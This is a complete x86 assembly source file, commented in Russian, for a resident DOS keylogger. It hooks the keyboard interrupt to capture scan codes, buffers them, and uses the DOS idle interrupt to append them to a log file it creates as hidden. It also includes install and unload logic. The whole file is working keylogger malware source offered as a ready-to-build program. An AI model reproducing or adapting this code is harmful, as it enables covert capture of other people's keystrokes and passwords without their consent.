;
; Простой TSR кейлоггер.
;  (C) Tronix, 2010
;
; Compile with TASM v4.1
; tasm /m2 keylog.asm
; tlink /t keylog.obg
.MODEL Tiny
.CODE
.STARTUP
.386                                ;для jump near и команд pusha и popa
 
      jmp real_start                ;прыгаем на начало программы
magic       dw 0BABAh               ;идентификатор - уже сидим в памяти
logfile     db 'c:\klog.txt',0      ;имя файла
handle            dw 0              ;заголовок (хендл)
buf         db 41 dup (?)           ;буффер 40 байт + 1 байт на всякий
bufptr            dw 0              ;текущий указатель буффера (смещение)
must_write  db 0                    ;флаг готовности к записи
 
;Новый обработчик 09h прерывания
;IRQ1 - KEYBOARD DATA READY
new_09h:
      pushf                         ;сохраняем все флаги
      pusha                         ;основные регистры
      push  es                      ;регистры ES и DS
      push  ds
      push  cs                      ;в DS равен CS
      pop   ds
      ;cli                          ;запретим прерывания
      cmp   bufptr, 40              ;достигнут конец буффера?
      jae   call_old_09             ;уходим на старый обработчик
 
      in    al, 60h                 ;получить сканкод
 
      cmp   al, 39h                 ;получаем только нажатые
      ja    call_old_09             ;до пробела
      cmp   al, 2Ah                 ;не собираем коды > 39h
      je    call_old_09             ;не логируем SHIFT
      cmp   al, 36h                 ;ни левый ни правый
      je    call_old_09
 
      push  0
      pop   es                      ;в ES - 0 (BIOS)
      mov   ah, byte ptr es:[417h]  ;прочтем статус SHIFTа
      test  ah, 43h                 ;тестируем на обе SHIFT
      je    pk1                     ;и статус CAPSLOCK
 
      add   al, 80h                 ;сделаем ее большой в логе
   pk1: mov di, bufptr
      mov   buf[di], al             ;пишем в буффер сканкод
      inc   di                      ;увеличим указатель буфера
      mov   bufptr, di              ;запомним значение
      mov   must_write, 1           ;теперь можно писать буфер
                                    ;когда DOS вызовет int 28h
call_old_09:
      ;sti                          ;разрешим прерывания
      pop   ds
      pop   es
      popa
      popf                          ;востановим всю хренотень
      db 0eah                       ;jmp dword ptr (опкод)
old_09_offset  dw ?                 ;здесь уже конкретный адрес
old_09_segment dw ?                 ;старого Int 09. прыгаем туда
 
;Новый обработчик 28h прерывания
;DOS IDLE INTERRUPT
new_28h:
      pushf                         ;сейвим все что будем менять
      pusha
      push  es
      push  ds
      push  cs
      pop   ds
      cmp   must_write, 1           ;нужно записывать?
      jne   call_old_28             ;нет - сразу вывалеваемся
      cmp   bufptr, 40              ;буффер заполнен полностью?
      jb    call_old_28             ;нет - ничо не будем делать
 
      mov   ax, 3d01h
      lea   dx, logfile             ;открываем файло на
      int   21h                     ;чтение и запись
      jc    call_old_28             ;ошибка? Ну хз, выходим, чо
      mov   handle, ax
      mov   bx, ax                  ;сохраняем хендл
      mov   ax, 4202h
      xor   cx, cx
      xor   dx, dx
      int   21h                     ;прыгнем в конец файла
      jc    call_old_28             ;ошибка - выходим
      mov   ah, 40h
      mov   bx, handle
      mov   cx, bufptr
      lea   dx, buf
      int   21h                     ;дописываем в конец буффер
      jc    call_old_28             ;ошибка - выходим
      mov   ah, 3Eh
      mov   bx, handle
      int   21h                     ;закрываем файл
      jc    call_old_28
 
      mov   must_write, 0           ;не нужно больше писать
      mov   bufptr, 0               ;указатель буфера в нули
 
call_old_28:
      pop   ds                      ;восстанавливаем флаги и
      pop   es                      ;все такое прочее
      popa                          ;то что меняли
      popf
      db 0eah                       ;и прыгаем на старый обработчик
old_28_offset  dw ?
old_28_segment dw ?
 
;СТАРТ основной программы
real_start:
      mov   ax,3509h                ;получить в ES:BX вектор 09
      int   21h                     ;прерывания
 
      cmp   byte ptr ds:[82h],'-'   ;проверяем параметр командной
      je    remove                  ;строки. Равен "-" -выгружаемсо
 
      cmp   word ptr es:magic,0BABAh;сравниваем с идентификатором
      je    already_inst            ;мы уже загружены - выходим
 
      push  es
      mov   ax,ds:[2Ch]             ;psp
      mov   es,ax
      mov   ah,49h                  ;хватит памяти чтоб остаться
      int   21h                     ;резидентом?
      pop   es
      jc    not_mem                 ;не хватило - выходим
 
      mov   cs:old_09_offset,bx     ;запомним старый адрес 09
      mov   cs:old_09_segment,es    ;прерывания
      mov   ax,2509h                ;установим вектор на 09
      mov   dx,offset new_09h       ;прерывание
      int   21h
      mov   ax,3528h                ;получить в ES:BX вектор 28
      int   21h                     ;прерывания
      mov   cs:old_28_offset,bx     ;запомним старый адрес 28
      mov   cs:old_28_segment,es    ;прерывания
      mov   ax,2528h                ;установим вектор на 28
      mov   dx,offset new_28h       ;прерывание
      int   21h
 
      call  create_log_file         ;проверяем лог-файл.
                                    ;если нет - создаем.
 
      mov   dx,offset ok_installed  ;выводим что все ок
      mov   ah,9
      int   21h
      mov   dx,offset real_start    ;остаемся в памяти резидентом
      int   27h                     ;и выходим
;КОНЕЦ основной программы
 
;Проверим существует ли файл, если нет
;создадим его. Процедура.
create_log_file:
      mov   ax, 3D01h
      lea   dx, logfile
      int   21h                     ;попробуем открыть файл
      mov   handle, ax              ;
      jnc   clog4                   ;файл есть - закрываем его
 
 clog3: mov ah, 3Ch                 ;создаем файл
      mov   cx, 02h                 ;аттрибут - скрытый
      lea   dx, logfile
      int   21h
      mov   handle, ax
 
 clog4: mov bx, handle              ;закрываем файл
      mov   ah, 3Eh
      int   21h
      ret
 
;сюда попадаем если в командной строке
;был указан ключ "-". Выгружаемся из памяти
remove:
      cmp   word ptr es:magic,0BABAh;а мы ваще были загружены?
      jne   not_installed           ;не были - выходим
 
      push  es
      push  ds
      mov   dx,es:old_09_offset     ;возвращаем вектор прерывания
      mov   ds,es:old_09_segment    ;09 как и было
      mov   ax,2509h
      int   21h
      mov   dx,es:old_28_offset     ;востановим вектор прерывания
      mov   ds,es:old_28_segment    ;28 как было
      mov   ax,2528h
      int   21h
      pop   ds
      pop   es
      mov   ah,49h                  ;освобождаем память
      int   21h
      jc    not_remove              ;не освободилась? Хз - ошибка
 
      mov   dx,offset removed_msg   ;выводим сообщение - все ок
      mov   ah,9                    ;выгрузились
      int   21h
      jmp   exit                    ;выходим воще из проги
 
;Сюда попадаем если был указан ключ "-", но перед
;этим кейлоггер не был загружен
;Выводим "KEYLOG not installed. Nothing remove"
not_installed:
      mov   dx, offset noinst_msg
      mov   ah,9
      int   21h
      jmp   exit
 
;Какая-то ошибка с высвобождением памяти.
;Выводим "Can not remove KEYLOG. Error"
not_remove:
      mov   dx, offset noremove_msg
      mov   ah,9
      int   21h
      jmp   exit
 
;Пользователь пытается повторно загрузить прогу
;Выводим "KEYLOG already installed"
already_inst:
      mov   dx, offset already_msg
      mov   ah,9
      int   21h
      jmp   exit
 
;Не хватает памяти чтоб остаться резидентом
;Выводим "No free memory for loading KEYLOG"
not_mem:
      mov   dx, offset nomem_msg
      mov   ah,9
      int   21h
 
;Выходим из программы
exit:
      int  20h
 
ok_installed      db 'KEYLOG successful installed$'
already_msg       db 'KEYLOG already installed$'
nomem_msg         db 'No free memory for loading KEYLOG$'
removed_msg       db 'KEYLOG successful removed$'
noremove_msg      db 'Can not remove KEYLOG. Error$'
noinst_msg        db 'KEYLOG not installed. Nothing remove$'
END